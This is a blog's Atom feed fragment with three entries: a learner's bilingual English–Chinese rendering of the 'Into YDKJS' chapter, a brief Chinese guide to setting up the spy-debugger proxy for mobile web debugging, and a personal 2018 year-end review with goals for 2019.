    <content type="html"><![CDATA[<h2 id="Chapter-3-Into-YDKJS"><a href="#Chapter-3-Into-YDKJS" class="headerlink" title="Chapter 3: Into YDKJS"></a>Chapter 3: Into YDKJS</h2><p>What is this series all about? Put simply, it’s about taking seriously the task of learning all parts of JavaScript, not just some subset of the language that someone called “the good parts,” and not just whatever minimal amount you need to get your job done at work.</p><p>这一系列书主要用于谈论什么呢？简单来说，这一系列书主要用户讲述如何学好javascript，而不是学习一些人称之为javascript中好的部分，也不仅仅能让你搞定工作的那一小部分内容。</p><div><a id="more"></a></div><p>Serious developers in other languages expect to put in the effort to learn most or all of the language(s) they primarily write in, but JS developers seem to stand out from the crowd in the sense of typically not learning very much of the language. This is not a good thing, and it’s not something we should continue to allow to be the norm.</p><p>在其他语言中，认真的开发者总是希望努力学习他们主要使用语言的大部分或全部。但JS开发者通常不太学习这门语言，而显得特别突出。这不是一件好事，我们也不应该将其视为常态。</p><p>The You Don’t Know JS (YDKJS) series stands in stark(完全) contrast(对比) to the typical approaches to learning JS, and is unlike almost any other JS books you will read. It challenges you to go beyond your comfort zone(舒适区) and to ask the deeper “why” questions for every single behavior you encounter. Are you up for that challenge?</p><p>你不知道JS系列书籍与传统的学习JS方式大不相同，它也不像你所阅读的其他系列的JS书籍。它会使你遇到挑战逼迫你走出舒适区，对你遇到的每一个问题深入的问为什么。你准备好迎接挑战了吗？</p><p>I’m going to use this final chapter to briefly(短暂) summarize(总结) what to expect from the rest of the books in the series, and how to most effectively go about building a foundation of JS learning on top of(在…之上) YDKJS.</p><p>我将会用最后一章来做一个简短的总结，这一系列其他章节的内容，如何更有效的通过YDKJS建立学习JS的基础。</p><h2 id="作用域-amp-闭包"><a href="#作用域-amp-闭包" class="headerlink" title="作用域 &amp; 闭包"></a>作用域 &amp; 闭包</h2><p>Perhaps one of the most fundamental things you’ll need to quickly come to terms with is how scoping of variables really works in JavaScript. It’s not enough to have anecdotal fuzzy beliefs about scope.</p><p>可能你最需要尽快明白的基本原理就是变量的作用域是如何在JS中工作的。仅仅只知道关于作用域模糊的概念是不够的。</p><p>The Scope &amp; Closures title starts by debunking the common misconception that JS is an “interpreted language” and therefore not compiled. Nope.</p><p>作用域 &amp; 闭包这一章节从揭示最常见的误解开始，JS是一门解释性语言，而不是被编译的。不对。</p><p>The JS engine compiles your code right before (and sometimes during!) execution. So we use some deeper understanding of the compiler’s approach to our code to understand how it finds and deals with variable and function declarations. Along the way, we see the typical metaphor for JS variable scope management, “Hoisting.”</p><p>JS引擎会对你的代码进行编译在你的代码执行之前(有时在执行时)。所以我们需要深入理解编译器处理我们代码的方式，以理解编译器如何找到并处理申明的变量和函数。沿着这条路，我们将见到js变量作用域管理特有的隐式提升。</p><p>This critical(批评的、决定性的) understanding of “lexical(词汇) scope” is what we then base our exploration of closure on for the last chapter of the book. Closure is perhaps the single most important concept in all of JS, but if you haven’t first grasped(抓住、理会) firmly how scope works, closure will likely remain beyond your grasp.</p><p>理解作用域这一关键词是至关重要的，在最后一张它是我们理解和探索闭包的基础。闭包可能是js所有概念中最重要之一，但是如果你第一次没有完全理解作用域的工作原理，闭包将会超越你的理解。</p><p>One important application of closure is the module pattern, as we briefly introduced in this book in Chapter 2. The module pattern is perhaps the most prevalent code organization pattern in all of JavaScript; deep understanding of it should be one of your highest priorities.</p><p>模块模式是闭包中一个重要的应用，我们在本书第二章会将会介绍它的基础概念。模块模式可能是所有js流行代码组织的模式。深入理解它应该是你最优先做的事情。</p><h2 id="this-amp-Object-Prototypes"><a href="#this-amp-Object-Prototypes" class="headerlink" title="this &amp; Object Prototypes"></a>this &amp; Object Prototypes</h2><p>Perhaps one of the most widespread and persistent mistruths about JavaScript is that the this keyword refers to the function it appears in. Terribly mistaken.</p><p>可能关于JS最普遍最持久的谬论是关键词this指代的是它的所出现的函数。可怕的谬论。</p><p>The this keyword is dynamically bound based on how the function in question is executed, and it turns out there are four simple rules to understand and fully determine this binding.</p><p>关键词this的指向动态的基于函数是如何执行的，是这里有四个简单的规则去理解和选择this绑定。</p><p>Closely related to the this keyword is the object prototype mechanism, which is a look-up chain for properties, similar to how lexical scope variables are found. But wrapped up in the prototypes is the other huge miscue about JS: the idea of emulating (fake) classes and (so-called “prototypal”) inheritance.</p><p>与this关键词密密相关的是object原型的原理，这是一个查找属性的链。与查询的方式相似。但是包含在原型中另一个JS的巨大谬论:模拟类和继承的想法</p><p>Unfortunately, the desire to bring class and inheritance design pattern thinking to JavaScript is just about the worst thing you could try to do, because while the syntax may trick you into thinking there’s something like classes present, in fact the prototype mechanism is fundamentally opposite in its behavior.</p><p>不幸的是，渴望将类和继承设计模式的想法带入JS将是你做的最糟糕的事情，因为将这种语法会使你认为有类的功能的存在，事实上原型原来是与类的概念是完全相反的。</p><p>What’s at issue is whether it’s better to ignore the mismatch and pretend that what you’re implementing is “inheritance,” or whether it’s more appropriate to learn and embrace how the object prototype system actually works. The latter is more appropriately named “behavior delegation.”</p><p>问题是忽略它的不匹配并且假装是在完成继承是否是一件好事，或者学习并拥抱对象属性系统工作方式是否合适。后者被称为行为系统更合适。</p><p>This is more than syntactic preference. Delegation is an entirely different, and more powerful, design pattern, one that replaces the need to design with classes and inheritance. But these assertions will absolutely fly in the face of nearly every other blog post, book, and conference talk on the subject for the entirety of JavaScript’s lifetime.</p><p>这不仅仅是语法上的偏好。委托是一种完全不同更强大的设计模式，一个可以替换了需要类和继承的设计。但是在javascript整个生命周期中在几乎所有博客的文章、书籍和会议讨论关于这个主题都是背道而驰的。</p><p>The claims I make regarding delegation versus inheritance come not from a dislike of the language and its syntax, but from the desire to see the true capability of the language properly leveraged and the endless confusion and frustration wiped away.</p><p>我对委托和继承做出的宣言不是源于对语言和其语法的厌恶，而是来自于渴望看到这门语言的真实力量被正确地利用，渴望看到无尽的困惑与沮丧被一扫而光。</p><p>But the case I make regarding prototypes and delegation is a much more involved one than what I will indulge here. If you’re ready to reconsider everything you think you know about JavaScript “classes” and “inheritance,” I offer you the chance to “take the red pill” (Matrix 1999) and check out Chapters 4-6 of the this &amp; Object Prototypes title of this series.</p><p>但是我讲的关于原型和委托例子比我在这里讲的涉及的还要多。如果你准备好重新思考你所认为关于JS中的类和继承,我将会提供给你这个机会去思考并改变，然后你可以查阅这一系列的this &amp; object prototype的第4-6章</p><h2 id="Types-amp-Grammar"><a href="#Types-amp-Grammar" class="headerlink" title="Types &amp; Grammar"></a>Types &amp; Grammar</h2><p>The third title in this series primarily focuses on tackling yet another highly controversial topic: type coercion. Perhaps no topic causes more frustration with JS developers than when you talk about the confusions surrounding implicit coercion.</p><p>在这一系列中的第三标题主要讨论另一个比较有争议的话题:强制类型转换。可能没有什么话题能比你讨论混乱的类型转换能让JS开发者更沮丧的话题了。</p><p>By far, the conventional wisdom is that implicit coercion is a “bad part” of the language and should be avoided at all costs. In fact, some have gone so far as to call it a “flaw” in the design of the language. Indeed, there are tools whose entire job is to do nothing but scan your code and complain if you’re doing anything even remotely like coercion.</p><p>到目前为止，传统的智慧是既然强制类型转换是这门医院糟糕的部分，我们应当不计一切的成本去避免他。事实上，一些人去称之为语言坏的一部分。事实上，已经有很多专门扫描代码的工具，当你的代码中使用了强制类型转换或者类似强制转换的事情将会报警。</p><p>But is coercion really so confusing, so bad, so treacherous, that your code is doomed from the start if you use it?</p><p>但是强制类型真的如此混乱、如此糟糕、如此不可靠，以致于你在代码中使用它就导致你的代码走向灭亡了吗？</p><p>I say no. After having built up an understanding of how types and values really work in Chapters 1-3, Chapter 4 takes on this debate and fully explains how coercion works, in all its nooks and crevices. We see just what parts of coercion really are surprising and what parts actually make complete sense if given the time to learn.</p><p>不是的，不是这样的。在第1-3章中讲解了类型和值真实是如何工作的，第4章参与了这个讨论，并从全面的角度分析强制类型是如何工作的。如果你花时间去学习它的话你回对强制类型转换感到惊奇并且是十分完整的。</p><p>But I’m not merely suggesting that coercion is sensible and learnable, I’m asserting that coercion is an incredibly useful and totally underestimated tool that you should be using in your code. I’m saying that coercion, when used properly, not only works, but makes your code better. All the naysayers and doubters will surely scoff at such a position, but I believe it’s one of the main keys to upping your JS game.</p><p>但是我不仅仅建议强制类型转换是明智的并且可学的，我声明强制类型转换是非常有用的，你应该使用你的代码而不是使用那些检测工具。我要说当你正常使用强制类型转换不仅仅可以工作还会使你的代码更好。所有的否定者和怀疑者毫无疑问将会嘲笑这个立场，但是我相信它将会是你玩好JS的主键之一。</p><p>Do you want to just keep following what the crowd says, or are you willing to set all the assumptions aside and look at coercion with a fresh perspective? The Types &amp; Grammar title of this series will coerce your thinking.</p><p>你是否还是坚持相信大多数人所说的，或者是说你已经将所有的猜想都放到一边。并且对强制转换有了一个新的观点？类型和语法这一章将会强制转换你思考。</p><h2 id="Async-amp-Performance"><a href="#Async-amp-Performance" class="headerlink" title="Async &amp; Performance"></a>Async &amp; Performance</h2><p>The first three titles of this series focus on the core mechanics of the language, but the fourth title branches out slightly to cover patterns on top of the language mechanics for managing asynchronous programming. Asynchrony is not only critical to the performance of our applications, it’s increasingly becoming the critical factor in writability and maintainability.</p><p>这一系列的第三个标题我们将主要关注这门语言的核心技术，但是第四个标题稍微扩展了一些，以涵盖用于管理异步编程的语言机制之上的模式。一部不是唯一评判我们应用性能的标砖，越来越多的评判因素是根绝可写性和可维护性。</p><p>The book starts first by clearing up a lot of terminology and concept confusion around things like “async,” “parallel,” and “concurrent,” and explains in depth how such things do and do not apply to JS.</p><p>这本书首次开始理清大量的属于和混乱的概念类似于:异步、同步、并行，深入的解释这些东西如何用或者不用再JS上。</p><p>Then we move into examining callbacks as the primary method of enabling asynchrony. But it’s here that we quickly see that the callback alone is hopelessly insufficient for the modern demands of asynchronous programming. We identify two major deficiencies of callbacks-only coding: Inversion of Control (IoC) trust loss and lack of linear reason-ability.</p><p>然后我们将思考为什么回调作为主要的方法实现异步，但是我们将很快的看到回调对于异步编程来说，仅仅依靠回调是不够的。我们确定了回调代码的两个不足。控制反转(IoC)信任缺失，缺乏线性推理能力。</p><p>To address these two major deficiencies, ES6 introduces two new mechanisms (and indeed, patterns): promises and generators.</p><p>为了解决这两大不足，est介绍了两种技术:promise和generators</p><p>Promises are a time-independent wrapper around a “future value,” which lets you reason about and compose them regardless of if the value is ready or not yet. Moreover, they effectively solve the IoC trust issues by routing callbacks through a trustable and composable promise mechanism.</p><p>promise是一个关于未来值的时间包装，它允许你组成并推理他们，无论值是否已准备好。并且，他们有效的解决了控制反转信任问题，通过可信任和可组合的promise机制路由回调。</p><p>Generators introduce a new mode of execution for JS functions, whereby the generator can be paused at yield points and be resumed asynchronously later. The pause-and-resume capability enables synchronous, sequential looking code in the generator to be processed asynchronously behind the scenes. By doing so, we address the non-linear, non-local-jump confusions of callbacks and thereby make our asynchronous code sync-looking so as to be more reason-able.</p><p>Generators介绍了一个行的JS函数执行模式，凭借generator能通过yield关键词暂停并且稍后重新开始异步。这种暂停和重新开始的异步能力，在后台异步处理生成器中的顺序查找代码。通过这样做，我们能处理回调函数的非线性、回调之间的混乱跳转。因此能够使我们的异步代码越来越同步和可靠。</p><p>But it’s the combination of promises and generators that “yields” our most effective asynchronous coding pattern to date in JavaScript. In fact, much of the future sophistication of asynchrony coming in ES7 and later will certainly be built on this foundation. To be serious about programming effectively in an async world, you’re going to need to get really comfortable with combining promises and generators.</p><p>但是yields结合了promise和generators是我们至今为止在JS中最有效的异步代码风格。事实上，不远将来，在es7或者后面版本中将会迎来更复杂的异步的，可以确定的是都将建立在这个基础之上。认真对待异步世界中的有效编程,你需要去适应promise和generator的混合。</p><p>If promises and generators are about expressing patterns that let our programs run more concurrently and thus get more processing accomplished in a shorter period, JS has many other facets of performance optimization worth exploring.</p><p>如果promise和generator是关于表达模式，使我们的程序能够更并发地运行，从而在更短的时间内完成更多的处理，JS有很多其他性能优化的内容值得探索。</p><p>Chapter 5 delves into topics like program parallelism with Web Workers and data parallelism with SIMD, as well as low-level optimization techniques like ASM.js. Chapter 6 takes a look at performance optimization from the perspective of proper benchmarking techniques, including what kinds of performance to worry about and what to ignore.<br>第五章将进入并行主题的web工作和并行数据的SIMD，与低级别的压缩技术想ASM.js。第六章从基准技术来看一看性能优化，包括哪些性能是需要担忧的哪些是可以忽略的。</p><p>Writing JavaScript effectively means writing code that can break the constraint barriers of being run dynamically in a wide range of browsers and other environments. It requires a lot of intricate and detailed planning and effort on our parts to take a program from “it works” to “it works well.”</p><p>编写有效的javascript意味着编写能够打破能动态运行在大多数浏览器和其他环境的障碍。它能工作到它能工作的很好，需要很多复杂详细的计划和努力。</p><p>The Async &amp; Performance title is designed to give you all the tools and skills you need to write reasonable and performant JavaScript code.</p><p>这异步和性能标题是为了给你需要编写合理和高性能的js代码所需要的工具和技能。</p><p>ES6 &amp; Beyond<br>No matter how much you feel you’ve mastered JavaScript to this point, the truth is that JavaScript is never going to stop evolving, and moreover, the rate of evolution is increasing rapidly. This fact is almost a metaphor for the spirit of this series, to embrace that we’ll never fully know every part of JS, because as soon as you master it all, there’s going to be new stuff coming down the line that you’ll need to learn.</p><p>无论你感觉你多精通javascript，真理是javascript绝不停止更新，而且，更新的速度变得越来越快。事实从这一系列去拥抱我们踊跃都不可能知道Js的所有部分，因为你不可能精通它所有的部分，很快就可能有新的功能你需要去学习的。</p><p>This title is dedicated to both the short- and mid-term visions of where the language is headed, not just the known stuff like ES6 but the likely stuff beyond.</p><p>这个标题是专注于这门语言短期和中期房展方向的，不仅仅知道es6这样的东西还有其他可能得东西</p><p>While all the titles of this series embrace the state of JavaScript at the time of this writing, which is mid-way through ES6 adoption, the primary focus in the series has been more on ES5. Now, we want to turn our attention to ES6, ES7, and …</p><p>而本系列的所有标题包含了这一时期协作的javascript状态，哪些中等方法通过了es6的采用，着一些列主要关注更多的在于es5，现在我们将要转变我们的注意到es6、es7更多</p><p>Since ES6 is nearly complete at the time of this writing, ES6 &amp; Beyond starts by dividing up the concrete stuff from the ES6 landscape into several key categories, including new syntax, new data structures (collections), and new processing capabilities and APIs. We cover each of these new ES6 features, in varying levels of detail, including reviewing details that are touched on in other books of this series.</p><p>因为在写作之时es6已经接近完成，es6和beyond开始分割es6功能为几个关键分类，包括新的预发，新的数据结果和新的处理能力和api。我们覆盖了所有新的es6功能，在不变的详细等级，包括在这一系列的其他书上触摸到的细节。</p><p>Some exciting ES6 things to look forward to reading about: destructuring, default parameter values, symbols, concise methods, computed properties, arrow functions, block scoping, promises, generators, iterators, modules, proxies, weakmaps, and much, much more! Phew, ES6 packs quite a punch!</p><p>一些令人兴奋盼望去阅读的es6事物:解构、参数默认值、符号、简单方法、计算属性、箭头函数、块作用域、承诺、生成器、遍历、模块化、代理。es6很有冲击力</p><p>The first part of the book is a roadmap for all the stuff you need to learn to get ready for the new and improved JavaScript you’ll be writing and exploring over the next couple of years.</p><p>本书的第一部分是一张路线图，列出了你所有需要学习的内容。为了在未来几年编写和研究新的javascript内容和改进javascript做好准备。</p><p>The latter part of the book turns attention to briefly glance at things that we can likely expect to see in the near future of JavaScript. The most important realization here is that post-ES6, JS is likely going to evolve feature by feature rather than version by version, which means we can expect to see these near-future things coming much sooner than you might imagine.</p><p>本书的最后一部分转变注意力到，简单浏览一下在不远将来我们能在javascript中看到的内容。es6的发布是最重要的关系，JS看起来就像进入了一个功能接一个功能一个版本接一个版本。这意味着我们能探索的不远将来的事情很快就会到来，比你想象的还要快。</p><p>The future for JavaScript is bright. Isn’t it time we start learning it!?</p><p>Javascript的未来是明亮的。现在不是我们开始学习的时候了吗？</p><p>Review<br>The YDKJS series is dedicated to the proposition that all JS developers can and should learn all of the parts of this great language. No person’s opinion, no framework’s assumptions, and no project’s deadline should be the excuse for why you never learn and deeply understand JavaScript.</p><p>你不懂js系列是专注于所有JS开发者能并且应该学习这一伟大语言的所有部分的这一命题。没有个人之见，没有框架假设，没有项目期限能成为你为什么学习并且深入理解javascript的原因。</p><p>We take each important area of focus in the language and dedicate a short but very dense book to fully explore all the parts of it that you perhaps thought you knew but probably didn’t fully.</p><p>我们谈论这门语言应该关注的重点地方并且致力于简短，但是非常浓密的书去充分探索有可能认为你知道倒是可能不全面的所有部分。</p><p>“You Don’t Know JS” isn’t a criticism or an insult. It’s a realization that all of us, myself included, must come to terms with. Learning JavaScript isn’t an end goal but a process. We don’t know JavaScript, yet. But we will!</p><p>你不懂JS不是批评和侮辱。这是我们所有人人认知的，我自己也不例外。学习javascript不是一个最终目标但是是一个过程。我们不懂javascript，但是我们将会懂得。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Chapter-3-Into-YDKJS&quot;&gt;&lt;a href=&quot;#Chapter-3-Into-YDKJS&quot; class=&quot;headerlink&quot; title=&quot;Chapter 3: Into YDKJS&quot;&gt;&lt;/a&gt;Chapter 3: Into YDKJS&lt;/h2&gt;&lt;p&gt;What is this series all about? Put simply, it’s about taking seriously the task of learning all parts of JavaScript, not just some subset of the language that someone called “the good parts,” and not just whatever minimal amount you need to get your job done at work.&lt;/p&gt;
&lt;p&gt;这一系列书主要用于谈论什么呢？简单来说，这一系列书主要用户讲述如何学好javascript，而不是学习一些人称之为javascript中好的部分，也不仅仅能让你搞定工作的那一小部分内容。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="book" scheme="http://zhoushaw.github.io/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>spy-debugger</title>
    <link href="http://zhoushaw.github.io/2019/02/04/learning/font-end/debugger/spy-debugger/"/>
    <id>http://zhoushaw.github.io/2019/02/04/learning/font-end/debugger/spy-debugger/</id>
    <published>2019-02-04T00:52:35.000Z</published>
    <updated>2019-04-14T13:54:11.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>移动端web调试十分麻烦，chrome调试工具不支持ios，在ios端出现兼容问题将十分难易调试，普通的log方式调试时间大量损耗，有没有一个方便易用的方式呢，spy-debugger可以很好的解决的这个问题，跨多端webview调试也非常方便快捷</p><div><a id="more"></a></div><h2 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h2><blockquote><p>安装</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install spy-debugger -g</span><br></pre></td></tr></table></figure><blockquote><p>启动</p></blockquote><p><code>spy-debugger</code></p><blockquote><p>环境配置</p></blockquote><p>手机与pc保持同一个局域网<br>ios代理设置:设置 - 无线局域网 - 选中网络 - HTTP代理手动</p><p>代理配置信息为，启动命令行窗口中会暴露ip地址和端口号</p><blockquote><p>安装正式</p></blockquote><p>浏览器访问:<a href="http://s.xxx(真实域名就是这个不用怀疑)" target="_blank" rel="noopener">http://s.xxx(真实域名就是这个不用怀疑)</a><br>按照操作步骤完成安装，</p><blockquote><p>信任证书</p></blockquote><p>1.设置 - 通用 - 证书信任设置 - 设置node-mitmproxy为信任证书<br>2.设置 - 通用 - 关于手机 - 证书信任设置 - 设置node-mitmproxy为信任证书</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;移动端web调试十分麻烦，chrome调试工具不支持ios，在ios端出现兼容问题将十分难易调试，普通的log方式调试时间大量损耗，有没有一个方便易用的方式呢，spy-debugger可以很好的解决的这个问题，跨多端webview调试也非常方便快捷&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="debugger" scheme="http://zhoushaw.github.io/categories/debugger/"/>
    
    
      <category term="debugger" scheme="http://zhoushaw.github.io/tags/debugger/"/>
    
  </entry>
  
  <entry>
    <title>2018年终总结</title>
    <link href="http://zhoushaw.github.io/2019/01/09/2018%E6%80%BB%E7%BB%93/"/>
    <id>http://zhoushaw.github.io/2019/01/09/2018总结/</id>
    <published>2019-01-09T02:17:35.000Z</published>
    <updated>2019-04-14T13:54:11.944Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Hi,我在浙江杭州，现在是北京时间2019.1.9 10:17，这里是一份晚到的年终总结。年终这段时间非常忙，很想提笔写下这一年，但始终抽不出时间(就是懒)。</p><p>从2018-2019更多的是心态上的转变，从实习开始算起，满打满算已经工作一年时间了。从学校到社会看到了完备的工程体系，看到了以后的生活和未来。</p><div><a id="more"></a></div><p>来杭已快半年了，2018年从学生完成了一个社会人的转变，细想2018年初立下的flag好像没并完成几个🤣。</p><blockquote><p>2018年初立下的flag:</p></blockquote><ul><li>英语水平六级以上，技术文章视频听写无阻碍</li><li>技术广度提升，包括但不限于前端技术:nodeJs、ReactNative、Python</li><li>做几个有技术水平的开源项目</li><li>健身、身体素质水平提升(毕竟身体才是革命的本钱)</li><li>技术深度提升:研究Vue源码、React源码，基础变得更加牢固</li></ul><p>细想过去的一年并未发现自己有太大的成长，也没有从想象的初级程序员迈向高级工程师，英语水平也没有明显提升，技术广度和深度也没有太大提升。不过值得庆幸来到蘑菇街看到了更完善的工程体系，身体素质也逐渐恢复到了一个正常水平(被上一家公司摧残了🤣)。</p><p>从事前端工作已经接近一年了，我在想这是我当初入行前端的初心吗，每天编写业务代码，做着重复的工作。生活并没有我想想的那样富有创造力，如何重新找回对技术的激情呢。</p><h3 id="新年展望"><a href="#新年展望" class="headerlink" title="新年展望"></a>新年展望</h3><p>算了年终总结应该按照惯例立下新年flag(希望今年年底不会被打肿脸):</p><blockquote><p>需要看完的书籍:</p></blockquote><ul><li><p>技术类</p><ul><li>你不知道的javascript</li><li>javascript函数编程指南</li><li>javascript高级程序设计</li><li>javascript设计模式</li><li>css世界</li><li>计算机网络</li><li>编译原理</li><li>计算机组成原理</li></ul></li><li><p>其他类型</p><ul><li>人类简史</li><li>流浪地球</li></ul></li></ul><blockquote><p>需要学习的新技术:</p></blockquote><ul><li>flutter</li><li>Electron</li><li>WebAssembly</li><li>chrome插件开发</li></ul><p>至少看完十本:</p><ul><li>三体</li><li>人类简史</li></ul><blockquote><p>新的语言</p></blockquote><ul><li>C++</li><li>Java</li></ul><blockquote><p>生活方面</p></blockquote><ul><li>今年存款7万+吧</li><li>拿到驾照</li><li>带她回家见家长</li></ul><h2 id="过去一年的回顾"><a href="#过去一年的回顾" class="headerlink" title="过去一年的回顾"></a>过去一年的回顾</h2><p>值得庆幸的是从深圳到杭州，来到蘑菇街，加入了自己期待的团队，但成长一直都是属于自己的事情，无论身边人多么优秀一切都需要靠自己。19年想提醒自己最终要的一件事情:带脑子干活，从项目设计到最终落地，一定要时刻保持紧张、紧迫感，敬畏每一行代码，因为你永远不知道你认为的一行简单的代码会带来多大的灾难。</p><p>18年没有发生大事故值得庆幸，在支付团队的时候，在现金贷业务中导致了一大批风险用户放款成功，虽然后端主要责任，但作为项目的前端开发也没有做到及时发现风险，导致后面大批风险用户借款成功。还好后面风险用户跟进发现数据十分正常，还好在贷前风控做的不错，不然真算的上是P0级别的事故了。</p><p>18年11月份中旬的时候，从支付部门转到了主站。原来的闲鱼生活彻底消失了，就一个忙~，忙碌的生活让自己没法🤔,怎么样才能让自己有充足的时间思考并提升呢,19年可能要从以下几方面入手:</p><ul><li>需求提审前做足功课，分析所有的技术难点，需求优化，在不影响功能的同时提升生产效率</li><li>排期合理化，不要让自己想18年年末那样忙死忙活的把需求赶出来，毕竟老大都说不要加班了~</li><li>多总结，既然需求多那就从做需求中学习吧，逐步提升开发效率，遇到问题及时记录并深究问题出现的原因及背后一系列的技术点</li></ul><p>最想要提升的英语方面并没有很大的提升😢，19年想在这方面加强。毕竟做软件开发不能只提升技术方面的知识，软实力也相当重要，在19年有哪些软实力需要提升的呢，英语方面的能力、阅读能力、写作能力、沟通交流能力，只要把这几方面的基础能力提升、加强，在后面的工作生活中才能走的更稳健。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Hi,我在浙江杭州，现在是北京时间2019.1.9 10:17，这里是一份晚到的年终总结。年终这段时间非常忙，很想提笔写下这一年，但始终抽不出时间(就是懒)。&lt;/p&gt;
&lt;p&gt;从2018-2019更多的是心态上的转变，从实习开始算起，满打满算已经工作一年时间了。从学校到社会看到了完备的工程体系，看到了以后的生活和未来。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
</feed>
